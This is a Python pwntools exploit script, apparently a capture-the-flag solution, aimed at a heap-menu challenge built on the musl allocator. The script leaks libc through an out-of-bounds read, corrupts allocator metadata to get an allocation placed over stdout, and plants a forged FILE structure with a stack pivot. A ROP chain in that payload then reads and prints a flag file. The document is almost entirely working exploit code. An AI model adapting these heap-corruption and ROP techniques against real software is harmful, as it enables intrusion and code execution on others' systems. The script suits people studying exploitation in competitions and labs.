#!/usr/bin/env python3
from pwn import *
import struct, sys
from collections import Counter

context.arch = 'amd64'

REMOTE = False
RHOST, RPORT = '34.107.64.195', 31323
LHOST, LPORT = '127.0.0.1', 3001

KNOWN_LIBC_MEMS = [0xaff40]
STDOUT_OFF      = 0xad280
POP_RDI = 0x152a1; RET_GAD = 0x152a2; POP_RSI = 0x1b0a1
POP_RDX = 0x2a50b; POP_RAX = 0x16a86; SYSCALL = 0x21270
PIVOT   = 0x789f5
SC17_STRIDE = 0x2A0; ALLOC_SIZE = 668; META_SIZE = 0x28

def conn():
    return remote(RHOST, RPORT) if REMOTE else remote(LHOST, LPORT)

def menu(p, c):  p.sendlineafter(b'> ', str(c).encode())
def do_alloc(p, idx, sz, data):
    menu(p, 1); p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(sz).encode()); p.sendafter(b'Content: ', data)
def do_print(p, idx):
    menu(p, 3); p.sendlineafter(b'Index: ', str(idx).encode())
def parse_meta(raw, i):
    o = i * META_SIZE
    if o + META_SIZE > len(raw): return None
    return {'off': o, 'mem': u64(raw[o+16:o+24]),
            'avail_mask': struct.unpack_from('<I', raw, o+24)[0],
            'sizeclass': (u64(raw[o+32:o+40]) >> 6) & 0x3f}

def exploit():
    p = conn()

    # Step 1: heap grooming
    do_alloc(p, 1, 512, b'A'*512)
    do_alloc(p, 0, 512, b'B'*512)

    # Step 2: leak libc via OOB print
    do_print(p, 16)
    resp = p.recvuntil(b'5. Exit\n> ', timeout=10)
    dm = resp.find(b'Data: ')
    if dm >= 0: resp = resp[dm+6:]
    mm = resp.rfind(b'\n1. Alloc')
    raw = resp[:mm] if mm >= 0 else resp

    # Dynamic libc pointer detection
    ptrs = [(o, u64(raw[o:o+8]), u64(raw[o:o+8])>>32)
            for o in range(0, len(raw)-7, 8) if 0x1000 < u64(raw[o:o+8]) < 0x7fffffffffff]
    majority = Counter(pf for _,_,pf in ptrs).most_common(1)[0][0]
    libc_cands = [(o, v) for o, v, pf in ptrs if pf != majority]

    libc_base = None
    for _, val in libc_cands:
        for km in KNOWN_LIBC_MEMS:
            c = val - km
            if c > 0 and (c & 0xfff) == 0: libc_base = c; break
        if libc_base: break
    stdout_addr = libc_base + STDOUT_OFF

    # Find SC17 meta with available slot
    sc17 = next(m for i in range(len(raw)//META_SIZE)
                if (m := parse_meta(raw, i)) and m['sizeclass']==17 and m['avail_mask'])
    avail = sc17['avail_mask']
    slot = next(s for s in range(8) if avail & (1<<s))
    slot_base = slot * SC17_STRIDE + 0x10

    # Step 3: corrupt meta.mem â†’ stdout
    target_mem = stdout_addr - slot_base
    edit_data = bytearray(raw)
    edit_data[sc17['off']+16 : sc17['off']+24] = p64(target_mem)
    p.sendline(b'4')
    p.sendlineafter(b'Index: ', b'16')
    p.sendafter(b'New Content: ', bytes(edit_data))

    # Step 4: alloc at stdout with FILE + ORW payload
    G = lambda off: libc_base + off
    pay = bytearray(ALLOC_SIZE)
    struct.pack_into('<Q', pay, 0x20, stdout_addr)           # wend
    struct.pack_into('<Q', pay, 0x28, stdout_addr)           # wpos
    struct.pack_into('<Q', pay, 0x30, stdout_addr + 0x100)   # pivot RSP
    struct.pack_into('<Q', pay, 0x38, G(RET_GAD))            # pivot JMP
    struct.pack_into('<Q', pay, 0x48, G(PIVOT))              # write fn
    struct.pack_into('<Q', pay, 0x60, 1)                     # buf_size
    struct.pack_into('<I', pay, 0x78, 1)                     # fd
    struct.pack_into('<i', pay, 0x8c, -1)                    # lock
    struct.pack_into('<i', pay, 0x90, -1)                    # lbf
    pay[0x98:0x98+19] = b"/home/ctf/flag.txt\x00"

    buf = libc_base + 0xae000
    rop = flat(
        G(POP_RDI), stdout_addr+0x98, G(POP_RSI), 0, G(POP_RAX), 2, G(SYSCALL),
        G(POP_RDI), 3, G(POP_RSI), buf, G(POP_RDX), 128, G(POP_RAX), 0, G(SYSCALL),
        G(POP_RDI), 1, G(POP_RSI), buf, G(POP_RDX), 128, G(POP_RAX), 1, G(SYSCALL),
        G(POP_RDI), 0, G(POP_RAX), 60, G(SYSCALL),
    )
    pay[0x100:0x100+len(rop)] = rop

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', b'2')
    p.sendlineafter(b'Size: ', str(ALLOC_SIZE).encode())
    p.sendafter(b'Content: ', bytes(pay))

    # Step 5: receive flag
    result = p.recvall(timeout=5)
    print(result)

if __name__ == '__main__':
    REMOTE = '--remote' in sys.argv
    exploit()